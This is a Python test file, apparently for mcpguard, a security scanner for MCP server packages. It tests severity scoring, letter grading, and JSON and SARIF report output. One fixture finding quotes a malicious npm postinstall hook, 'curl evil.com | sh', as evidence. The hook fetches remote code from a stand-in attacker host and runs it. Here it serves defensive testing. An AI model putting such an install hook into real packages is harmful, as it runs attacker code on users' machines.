"""Tests for mcpguard reporters and scoring utilities."""

from __future__ import annotations

import json
from pathlib import Path

from mcpguard.reporter import JSONReporter, SARIFReporter
from mcpguard.rules.base import Finding, Severity
from mcpguard.scanner import ScanResult, calculate_score, grade

# ============================================================================
# Helpers — pre-built findings
# ============================================================================


def _critical() -> Finding:
    return Finding(
        rule_id="MCP005",
        severity=Severity.CRITICAL,
        title="Malicious lifecycle script: postinstall",
        description="Installs a backdoor.",
        file_path="package.json",
        line=None,
        evidence='"postinstall": "curl evil.com | sh"',
        remediation="Remove the script.",
    )


def _high() -> Finding:
    return Finding(
        rule_id="MCP001",
        severity=Severity.HIGH,
        title="Missing authentication on MCP tool endpoint",
        description="Tool has no auth guard.",
        file_path="index.js",
        line=4,
        evidence="server.tool('read_file', async ({ path }) => {",
        remediation="Add verifyToken check.",
    )


def _medium() -> Finding:
    return Finding(
        rule_id="MCP002",
        severity=Severity.MEDIUM,
        title="process.env access in tool handler",
        description="Env vars exposed.",
        file_path="index.js",
        line=7,
        evidence="const s = process.env.SECRET;",
        remediation="Read env at startup only.",
    )


def _make_result(findings: list[Finding], name: str = "test-pkg") -> ScanResult:
    sc = calculate_score(findings)
    return ScanResult(
        name=name,
        version="1.0.0",
        package_dir=Path("/tmp/fake"),
        findings=findings,
        score=sc,
        grade=grade(sc),
        files_scanned=3,
    )


# ============================================================================
# calculate_score
# ============================================================================


class TestCalculateScore:
    def test_empty_findings_score_100(self):
        assert calculate_score([]) == 100

    def test_one_critical(self):
        assert calculate_score([_critical()]) == 75

    def test_one_high(self):
        assert calculate_score([_high()]) == 85

    def test_one_medium(self):
        assert calculate_score([_medium()]) == 92

    def test_critical_plus_high(self):
        """1 CRITICAL + 1 HIGH = 100 - 25 - 15 = 60."""
        assert calculate_score([_critical(), _high()]) == 60

    def test_score_clamped_to_zero(self):
        """Many CRITICALs clamp at 0, never negative."""
        findings = [_critical()] * 10
        assert calculate_score(findings) == 0

    def test_mixed_severities(self):
        """Deductions: 25 + 15 + 8 = 48 → score = 52."""
        findings = [_critical(), _high(), _medium()]
        assert calculate_score(findings) == 52

    def test_info_penalty_is_one(self):
        info = Finding(
            rule_id="MCP001",
            severity=Severity.INFO,
            title="Info",
            description="Low priority note.",
            remediation="Consider this.",
        )
        assert calculate_score([info]) == 99

    def test_low_penalty_is_three(self):
        low = Finding(
            rule_id="MCP001",
            severity=Severity.LOW,
            title="Low",
            description="Minor issue.",
            remediation="Fix eventually.",
        )
        assert calculate_score([low]) == 97


# ============================================================================
# grade
# ============================================================================


class TestGrade:
    def test_grade_a(self):
        assert grade(100) == "A"
        assert grade(95) == "A"
        assert grade(90) == "A"

    def test_grade_b(self):
        assert grade(89) == "B"
        assert grade(80) == "B"
        assert grade(75) == "B"

    def test_grade_c(self):
        assert grade(74) == "C"
        assert grade(65) == "C"
        assert grade(55) == "C"

    def test_grade_d(self):
        assert grade(54) == "D"
        assert grade(45) == "D"
        assert grade(40) == "D"

    def test_grade_f(self):
        assert grade(39) == "F"
        assert grade(30) == "F"
        assert grade(0) == "F"

    def test_grade_boundary_60(self):
        """Score of 60 (1 CRITICAL + 1 HIGH) → grade C."""
        assert grade(60) == "C"

    def test_grade_boundary_75(self):
        """Score of 75 is exactly a B."""
        assert grade(75) == "B"


# ============================================================================
# JSONReporter
# ============================================================================


class TestJSONReporter:
    def test_json_reporter_produces_valid_json(self):
        result = _make_result([_critical(), _high()])
        output = JSONReporter().render(result)
        data = json.loads(output)
        assert isinstance(data, dict)

    def test_json_reporter_schema(self):
        """Output contains all required top-level keys."""
        result = _make_result([_critical(), _high()])
        data = json.loads(JSONReporter().render(result))

        for key in ("score", "findings", "name", "version", "grade", "files_scanned", "summary"):
            assert key in data, f"Missing key '{key}' in JSON output"

    def test_json_reporter_score_is_correct(self):
        """Score in JSON equals calculate_score of the given findings."""
        findings = [_critical(), _high()]
        result = _make_result(findings)
        data = json.loads(JSONReporter().render(result))
        assert data["score"] == 60

    def test_json_reporter_findings_list(self):
        """Each finding entry contains rule_id, severity, title."""
        result = _make_result([_critical()])
        data = json.loads(JSONReporter().render(result))

        assert len(data["findings"]) == 1
        f = data["findings"][0]
        for key in ("rule_id", "severity", "title", "description", "remediation"):
            assert key in f, f"Finding dict missing key '{key}'"

    def test_json_reporter_severity_is_string(self):
        """Severity values are stored as uppercase strings, not enum objects."""
        result = _make_result([_critical(), _high(), _medium()])
        data = json.loads(JSONReporter().render(result))
        for f in data["findings"]:
            assert isinstance(f["severity"], str)
            assert f["severity"] in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")

    def test_json_reporter_summary_counts(self):
        """summary.critical and summary.total are correct."""
        result = _make_result([_critical(), _critical(), _high()])
        data = json.loads(JSONReporter().render(result))
        assert data["summary"]["critical"] == 2
        assert data["summary"]["total"] == 3

    def test_json_reporter_empty_findings(self):
        """Empty findings list produces score=100 and grade=A."""
        result = _make_result([])
        data = json.loads(JSONReporter().render(result))
        assert data["score"] == 100
        assert data["grade"] == "A"
        assert data["findings"] == []

    def test_json_reporter_file_path_and_line_preserved(self):
        """File path and line number appear in the JSON output."""
        result = _make_result([_high()])
        data = json.loads(JSONReporter().render(result))
        f = data["findings"][0]
        assert f["file_path"] == "index.js"
        assert f["line"] == 4


# ============================================================================
# SARIFReporter
# ============================================================================


class TestSARIFReporter:
    def test_sarif_reporter_valid_json(self):
        result = _make_result([_critical()])
        output = SARIFReporter().render(result)
        json.loads(output)  # must not raise

    def test_sarif_reporter_valid_structure(self):
        """SARIF output has $schema, version, and a single run."""
        result = _make_result([_critical(), _high()])
        data = json.loads(SARIFReporter().render(result))

        assert "$schema" in data
        assert data["version"] == "2.1.0"
        assert "runs" in data
        assert len(data["runs"]) == 1

    def test_sarif_tool_driver_name(self):
        """runs[0].tool.driver.name == 'mcpguard'."""
        result = _make_result([_critical()])
        data = json.loads(SARIFReporter().render(result))
        assert data["runs"][0]["tool"]["driver"]["name"] == "mcpguard"

    def test_sarif_tool_driver_version(self):
        """Tool driver version matches mcpguard.__version__."""
        from mcpguard import __version__

        result = _make_result([_critical()])
        data = json.loads(SARIFReporter().render(result))
        assert data["runs"][0]["tool"]["driver"]["version"] == __version__

    def test_sarif_results_count(self):
        """Number of SARIF results matches number of findings."""
        findings = [_critical(), _high(), _medium()]
        result = _make_result(findings)
        data = json.loads(SARIFReporter().render(result))
        assert len(data["runs"][0]["results"]) == 3

    def test_sarif_result_levels(self):
        """CRITICAL/HIGH → 'error', MEDIUM → 'warning', LOW/INFO → 'note'/'none'."""
        result = _make_result([_critical(), _high(), _medium()])
        data = json.loads(SARIFReporter().render(result))
        levels = {r["ruleId"]: r["level"] for r in data["runs"][0]["results"]}
        assert levels["MCP005"] == "error"  # CRITICAL
        assert levels["MCP001"] == "error"  # HIGH
        assert levels["MCP002"] == "warning"  # MEDIUM

    def test_sarif_result_location(self):
        """Results with file_path include physicalLocation."""
        result = _make_result([_high()])
        data = json.loads(SARIFReporter().render(result))
        sarif_result = data["runs"][0]["results"][0]
        assert "locations" in sarif_result
        loc = sarif_result["locations"][0]["physicalLocation"]
        assert loc["artifactLocation"]["uri"] == "index.js"
        assert loc["region"]["startLine"] == 4

    def test_sarif_rules_deduped(self):
        """Two findings from the same rule produce only one driver rule entry."""
        f1 = _critical()
        f2 = Finding(
            rule_id="MCP005",
            severity=Severity.CRITICAL,
            title="Another critical",
            description="desc",
            remediation="fix",
        )
        result = _make_result([f1, f2])
        data = json.loads(SARIFReporter().render(result))
        rule_ids = [r["id"] for r in data["runs"][0]["tool"]["driver"]["rules"]]
        assert rule_ids.count("MCP005") == 1

    def test_sarif_empty_findings(self):
        """Empty findings produce zero SARIF results and no driver rules."""
        result = _make_result([])
        data = json.loads(SARIFReporter().render(result))
        assert data["runs"][0]["results"] == []
        assert data["runs"][0]["tool"]["driver"]["rules"] == []

    def test_sarif_properties_include_score(self):
        """SARIF run properties contain the numeric score."""
        result = _make_result([_critical(), _high()])
        data = json.loads(SARIFReporter().render(result))
        props = data["runs"][0]["properties"]
        assert props["score"] == 60
        assert props["grade"] == "C"
